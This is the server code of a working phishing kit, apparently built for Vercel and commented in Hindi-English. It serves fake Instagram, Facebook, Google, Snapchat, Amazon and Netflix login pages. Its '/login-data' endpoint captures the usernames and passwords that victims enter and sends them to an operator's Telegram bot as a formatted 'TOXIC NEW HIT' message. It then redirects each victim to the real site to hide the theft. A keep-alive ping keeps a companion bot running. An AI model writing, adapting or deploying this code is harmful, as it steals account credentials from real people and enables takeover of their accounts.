const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();

// --- ⚙️ CONFIGURATION (Loaded from Vercel's Environment Variables) ⚙️ ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const RENDER_BOT_URL = process.env.RENDER_BOT_URL; // Yeh zaroori hai "Stay-Alive" ke liye

// Service aur unke real links ka map
const redirectMap = {
    'Instagram': 'https://www.instagram.com',
    'Facebook': 'https://www.facebook.com',
    'Google': 'https://www.google.com',
    'Snapchat': 'https://www.snapchat.com',
    'Amazon': 'https://www.amazon.com',
    'Netflix': 'https://www.netflix.com'
};

app.use(bodyParser.urlencoded({ extended: true }));

// --- DYNAMIC PAGE SERVER ---
// Yeh link ke hisaab se sahi page dikhayega
app.get('/', (req, res) => {
    const service = req.query.service;
    if (service && redirectMap[service]) {
        res.sendFile(path.join(__dirname, 'pages', service.toLowerCase() + '.html'));
    } else {
        res.status(404).send('Service Not Found.');
    }
});

// --- DATA CATCHER ---
// Yeh form ka data pakdega aur user ko bhejega
app.post('/login-data', (req, res) => {
    const { username, password, service, recipientId } = req.body;
    if (!username || !password || !service || !recipientId) {
        return res.status(400).send("Invalid request. User ID is missing.");
    }
    
    if (!BOT_TOKEN) {
        return res.status(500).send("Server configuration error: BOT_TOKEN is missing.");
    }

    const now = new Date();
    const date = now.toLocaleDateString('en-IN', { timeZone: 'Asia/Kolkata' });
    const time = now.toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
    const day = now.toLocaleString('en-IN', { weekday: 'long', timeZone: 'Asia/Kolkata' });

    const message = `
💎✨ !! TOXIC NEW HIT !! ✨💎
▬▬▬▬▬▬▬▬▬▬▬▬
🎯 **Service:** *${service}*
👤 **Username:** \`${username}\`
🔑 **Password:** \`${password}\`
▬▬▬▬▬▬▬▬▬▬▬▬
🕓 **Time:** ${time}
📅 **Date:** ${date}
🗓️ **Day:** ${day}
▬▬▬▬▬▬▬▬▬▬▬▬

MADE BY @CDMAXX
JOIN @TOXICBACK2025
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    axios.post(telegramApiUrl, {
        chat_id: recipientId,
        text: message,
        parse_mode: 'Markdown'
    })
    .then(() => res.redirect(redirectMap[service]))
    .catch(error => {
        console.error("Telegram API Error:", error.response ? error.response.data : "Unknown Error");
        res.status(500).send("Error sending data to user.");
    });
});


// --- NAYA UPGRADE: "STAY-ALIVE" PING ---
// Yeh endpoint har 14 minute mein call hoga Vercel Cron se
app.get('/ping', (req, res) => {
    if (RENDER_BOT_URL) {
        axios.get(RENDER_BOT_URL)
            .then(response => {
                console.log('Pinged Render bot successfully.');
                res.status(200).send('Ping successful.');
            })
            .catch(error => {
                console.error('Error pinging Render bot:', error.message);
                res.status(500).send('Ping failed.');
            });
    } else {
        res.status(400).send('Render Bot URL not configured.');
    }
});


// Vercel ke liye export karo
module.exports = app;
